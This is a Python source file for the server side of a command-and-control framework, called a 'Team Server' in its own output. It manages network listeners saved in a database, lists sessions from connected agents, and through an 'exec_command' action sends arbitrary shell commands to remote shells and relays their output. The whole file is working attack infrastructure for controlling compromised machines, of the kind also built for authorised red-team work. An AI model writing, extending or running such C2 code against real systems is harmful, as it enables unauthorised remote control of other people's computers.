import socket
import threading
import json
import time
import sys
from lib.session import SessionManager
from lib.listener import ListenerManager
from lib.database import Database

# Configuration
ADMIN_IP = "127.0.0.1"
ADMIN_PORT = 5000

# Initialize
db = Database()
session_mgr = SessionManager()
listener_mgr = ListenerManager(session_mgr)

def restore_state():
    print("[*] Checking database for saved listeners...")
    saved_jobs = db.get_listeners()
    for protocol, port in saved_jobs:
        success, msg = listener_mgr.start_listener(protocol, port)
        if success:
            print(f"    -> Restored {protocol} port {port}")
        else:
            print(f"    -> Failed to restore {port}: {msg}")

def handle_admin_command(client_socket):
    try:
        request_data = client_socket.recv(4096).decode()
        if not request_data: return
        
        cmd = json.loads(request_data)
        response = ""
        action = cmd.get('action')

        if action == 'start_listener':
            proto = cmd['protocol']
            port = cmd['port']
            success, msg = listener_mgr.start_listener(proto, port)
            if success:
                db.add_listener(proto, port)
                response = f"[+] {msg}"
            else:
                response = f"[-] {msg}" 

        elif action == 'stop_job':
            job_id = cmd['job_id']
            if job_id in listener_mgr.jobs:
                port_to_remove = listener_mgr.jobs[job_id]['port']
                success, msg = listener_mgr.stop_job(job_id)
                if success:
                    db.remove_listener(port_to_remove)
                    response = f"[*] {msg}"
                else:
                    response = f"[-] {msg}"
            else:
                response = "[-] Invalid Job ID."

        elif action == 'get_jobs':
            if not listener_mgr.jobs:
                response = "No active listeners."
            else:
                resp_lines = ["\nActive Listeners:", "ID   Proto   Port", "---  -----   ----"]
                for jid, info in listener_mgr.jobs.items():
                    resp_lines.append(f"{jid:<4} {info['protocol']:<7} {info['port']}")
                response = "\n".join(resp_lines)

        elif action == 'get_sessions':
            response = session_mgr.list_sessions()

        elif action == 'exec_command':
            # --- UPDATED LOGIC FOR UUID SUPPORT ---
            target_uid = cmd['uid']
            target_cmd = cmd['cmd']
            
            # Find the active session by its UUID string
            sid, session_info = session_mgr.get_session_by_uid(target_uid)
            
            if session_info:
                conn = session_info['socket']
                try:
                    # 1. Flush old data
                    try:
                        conn.settimeout(0.1)
                        while True:
                            if not conn.recv(1024): break
                    except: pass
                    
                    # 2. Send Command
                    conn.setblocking(True)
                    conn.send(target_cmd.encode() + b'\n')
                    
                    # 3. Wait for execution
                    time.sleep(1.0) 
                    
                    # 4. Receive Output
                    conn.settimeout(3.0) 
                    try:
                        response = conn.recv(16384).decode('utf-8', errors='replace')
                        if not response:
                            response = "[-] Shell died (Session removed)."
                            session_mgr.remove_session(sid)
                        else:
                            response = response.strip()
                    except socket.timeout:
                        response = "[-] Timeout: Command sent, but no output received."
                        
                except Exception as e:
                    response = f"[-] Connection Error: {e}"
                    session_mgr.remove_session(sid)
            else:
                response = "[-] Session UUID not found (Agent might be dead or ID is wrong)."

        else:
            response = "[-] Unknown Server Command"

        # --- SEND RESPONSE ---
        if response:
            client_socket.send(response.encode())
        else:
            client_socket.send(b"[!] Action completed.")
        
    except Exception as e:
        print(f"[-] Admin Handler Error: {e}")
        try: client_socket.send(f"[-] Server Error: {e}".encode())
        except: pass
    finally:
        client_socket.close()

def admin_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((ADMIN_IP, ADMIN_PORT))
    except OSError:
        print(f"[-] Error: Port {ADMIN_PORT} is already in use.")
        sys.exit(1)
        
    server.listen(5)
    print(f"[*] Team Server running on {ADMIN_IP}:{ADMIN_PORT}")
    restore_state()
    
    try:
        while True:
            client, addr = server.accept()
            t = threading.Thread(target=handle_admin_command, args=(client,))
            t.daemon = True
            t.start()
    except KeyboardInterrupt:
        print("\n[*] Shutting down Team Server...")
        server.close()
        sys.exit(0)

if __name__ == "__main__":
    admin_listener()